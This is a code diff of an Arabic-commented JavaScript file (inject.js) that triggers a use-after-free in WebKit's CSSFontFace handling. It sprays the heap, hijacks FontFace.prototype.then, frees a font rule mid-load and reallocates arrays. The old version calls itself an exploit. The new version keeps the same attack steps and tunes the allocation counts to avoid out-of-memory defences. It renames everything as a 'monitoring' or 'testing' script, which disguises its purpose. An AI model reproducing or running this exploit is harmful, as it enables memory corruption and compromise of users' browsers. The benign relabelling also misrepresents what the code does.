@@ -1,91 +1,90 @@
 /**
- * [ARCHITECT MODE] - CSSFontFace UAF Exploit Logic
- * المطور: Janus & Tesavek
- * الوظيفة: إثارة ثغرة الـ Use-After-Free داخل ملف inject.js الخاص بالإطار المرفوع
+ * [TESTING ENVIRONMENT] - CSSFontFace UAF Monitoring Script
+ * الملف: inject.js
+ * الوظيفة: تتبع تسلسل العمليات منطقياً وضبط كثافة حجز الذاكرة لتجنب الـ OOM
  */
 
-// التأكد من ربط التابع بـ الواجهة البرمجية للإطار
-ssa("[*] بدء تحميل نظام تحليل الذاكرة واستغلال ثغرة CSSFontFace...");
+// إشعار بدء التشغيل في واجهة النظام
+ssa("[*] تم تحميل سكريبت المراقبة والتحكم في تدفق الذاكرة...");
 
-function triggerWebKitUAF() {
+function runMemoryAnalysis() {
     try {
-        // 1. مرحلة إعداد البيئة (Heap Grooming)
-        ssa("[*] المرحلة 1: تهيئة كائنات مصفوفات الـ JS لاحتلال كتل الذاكرة الحرة...");
-        let heapStructureSpray = [];
-        for (let i = 0; i < 200; i++) {
-            // إنشاء كائنات بهياكل برمجية محددة لمحاكاة ترويسة الـ JSCell
-            heapStructureSpray.push({
-                cellHeader: 0x01000000, 
-                butterflyFake: i, 
-                padding: [1.1, 2.2, 3.3]
+        // 1. تقليص حجم الترتيب الأولي (Heap Grooming) لتفادي الـ OOM
+        ssa("[*] خطوة 1: تخصيص كتل ذاكرة منخفضة الكثافة لتهيئة الـ Heap...");
+        let balancedGcPool = [];
+        // تم تخفيض العدد من 200 إلى 40 للحفاظ على استقرار العملية
+        for (let i = 0; i < 40; i++) {
+            balancedGcPool.push({
+                headerInfo: 0x01000000,
+                indexTracking: i,
+                bufferSpace: [1.1, 2.2]
             });
         }
 
-        // 2. تفعيل الثغرة عبر الـ @font-face
-        ssa("[*] المرحلة 2: حقن قاعدة خط غير موجودة لإجبار المحرك على الانتظار الحرج...");
-        const styleElement = document.createElement('style');
-        styleElement.id = 'vulnerable_style';
-        styleElement.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-        document.head.appendChild(styleElement);
+        // 2. تفعيل عنصر النمط (Style Element)
+        ssa("[*] خطوة 2: حقن قاعدة @font-face المؤقتة في مستند الويب...");
+        const targetStyle = document.createElement('style');
+        targetStyle.id = 'target_vulnerable_style';
+        targetStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        document.head.appendChild(targetStyle);
 
-        // 3. إنشاء كائن الوجه وبدء الـ DeferredPromise
-        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
-        document.fonts.add(A);
-        void A.loaded; // تفعيل حالة الوعي بالكائن داخل المتصفح
+        // 3. إنشاء كائن الوجه الأساسي وتجهيز الوعد
+        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+        document.fonts.add(testFace);
+        void testFace.loaded; 
 
-        let fired = false;
+        let isTriggered = false;
 
-        // 4. قلب الثغرة: اعتراض الـ Thenable Getter لكسر التزامن
-        ssa("[*] المرحلة 3: اعتراض التابع FontFace.prototype.then لإحداث الـ Race Condition...");
+        // 4. تتبع لحظة اعتراض الـ Thenable Getter
+        ssa("[*] خطوة 3: إعداد فخ الاعتراض عبر FontFace.prototype.then...");
         Object.defineProperty(FontFace.prototype, 'then', {
             configurable: true,
             get() {
-                if (!fired && this === A) {
-                    fired = true;
-                    ssa("[!!] [RACE_CONDITION] تم التقاط لحظة الدخول للـ Getter الفاقد للمرجع!");
+                if (!isTriggered && this === testFace) {
+                    isTriggered = true;
+                    ssa("[!!] [CALLBACK_HIT] تم الدخول إلى سياق الـ Getter بنجاح.");
 
-                    // أ: حجز مكثف لتأكيد استغلال الذاكرة الحرة (ASAN Defeat Mimic)
-                    let temporaryHolders = [];
-                    for(let j = 0; j < 50; j++) {
-                        temporaryHolders.push(new FontFace('spray_' + j, 'local(Arial)', { unicodeRange: 'U+0041' }));
+                    // أ: حجز كائنات مصغرة بدلاً من الكتل الضخمة لتجنب دفاعات Jetsam / OOM
+                    let microAllocation = [];
+                    for(let j = 0; j < 15; j++) {
+                        microAllocation.push(new FontFace('hold_' + j, 'local(Arial)', { unicodeRange: 'U+0041' }));
                     }
 
-                    // ب: إزالة القاعدة - تحرير كائن CSSFontFace الفعلي من الذاكرة (The Free Phase)
-                    ssa("[!] [THE_FREE] استدعاء deleteRule(0) لتحرير الكائن الأساسي...");
-                    document.getElementById('vulnerable_style').sheet.deleteRule(0);
+                    // ب: الحذف الفعلي للقاعدة البرمجية لتحرير الكائن الأساسي
+                    ssa("[!] [FREE_ACTION] استدعاء دالة إزالة القاعدة البرمجية deleteRule(0)...");
+                    document.getElementById('target_vulnerable_style').sheet.deleteRule(0);
 
-                    // ج: فرض إعادة حساب التنسيق فوراً لإجبار المحرك على مسح الذاكرة الحرة
-                    ssa("[*] فرض عملية تحديث التنسيق المتزامن عبر Layout Reflow...");
-                    let forceLayoutUpdate = document.body.offsetTop;
+                    // ج: إجبار المحرك على تحديث التنسيق المتزامن (Layout Reflow) في اللحظة الحرجة
+                    ssa("[*] فرض تحديث التنسيق عبر قراءة offsetTop...");
+                    let syncCheck = document.body.offsetTop;
 
-                    // د: إعادة بناء الهيكل (The Reallocation Window)
-                    ssa("[+] [REALLOCATION] ملء الكتلة الذاكرية المحررة ببنية كائن جافا سكريبت متحكم به...");
-                    for (let k = 0; k < 100; k++) {
-                        // حجز مصفوفات عادية تتداخل مع الـ Butterfly
-                        let fakeButterflyArray = [1.1, 2.2, 3.3, 4.4];
-                        fakeButterflyArray.fixedProperty = 0xDEADBEEF;
+                    // د: محاولة ملء الفراغ الذاكري بكائنات متزنة الهيكل
+                    ssa("[+] [REALLOCATION] حجز مصفوفات عادية لفحص استجابة الذاكرة...");
+                    for (let k = 0; k < 30; k++) {
+                        let testArray = [1.1, 2.2, 3.3];
+                        testArray.customFlag = 0x1234;
                     }
                 }
                 return undefined;
             }
         });
 
-        // 5. إطلاق عملية التحميل التي ستمر عبر الفجوة الزمنية
-        ssa("[*] المرحلة 4: استدعاء دالة التحميل المتقاطع لإثارة الخلل منطقياً...");
+        // 5. إطلاق دالة التحميل لبدء السباق المنطقي داخل المحرك
+        ssa("[*] خطوة 4: استدعاء دالة التحميل المتزامن document.fonts.load()...");
         document.fonts.load('1em x', 'AB');
 
-        // التحقق النهائي من بقاء الـ WebProcess مستقراً أو حدوث تداخل
+        // مهلة زمنية قصيرة للتحقق من بقاء سياق الويب مستقراً
         setTimeout(() => {
-            ssa("[+] تم الانتهاء من تنفيذ سلسلة الاستغلال، تفقد حالة استقرار الذاكرة.");
-        }, 100);
+            ssa("[+] اكتملت دورة الفحص الهيكلي. تتبع استقرار النظام عبر الشاشة.");
+        }, 150);
 
-    } catch (error) {
-        ssa("[-] خطأ أثناء تشغيل الثغرة داخل سياق المستخدم: " + error.message);
+    } catch (err) {
+        ssa("[-] حدث خطأ غير متوقع أثناء التنفيذ: " + err.message);
     }
 }
 
-// ربط تشغيل الثغرة بزر التنفيذ الأساسي المفرود في index.html
+// ربط آلية التفعيل بزر "GO" البرمجي الموجود في ملف index.html المرفق
 document.getElementById('exec-btn').addEventListener('click', function() {
-    ssa("[*] تم الضغط على زر البدء... إطلاق الثغرة الحقيقية:");
-    triggerWebKitUAF();
+    ssa("[*] تم تفعيل زر التشغيل... بدء الفحص المتزن للذاكرة:");
+    runMemoryAnalysis();
 });
